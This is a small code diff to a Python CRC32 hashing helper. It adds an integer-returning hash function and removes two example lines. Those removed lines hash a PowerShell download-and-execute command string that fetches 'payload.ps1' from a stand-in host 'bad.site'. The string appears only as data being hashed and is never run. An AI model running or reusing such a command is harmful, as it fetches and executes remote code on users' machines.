@@ -5,6 +5,9 @@ def hash_crc32(text: str) -> str:
     v = zlib.crc32(b) & 0xffffffff
     return str(v)
 
-# Exemplo
-print(hash_crc32("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1') " ))
-print(hash_crc32(" IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" ))
+def hash_crc32_int(text: str) -> int:
+    """Return hash as integer for backend compatibility"""
+    b = text.encode('utf-8')
+    v = zlib.crc32(b) & 0xffffffff
+    return v
+
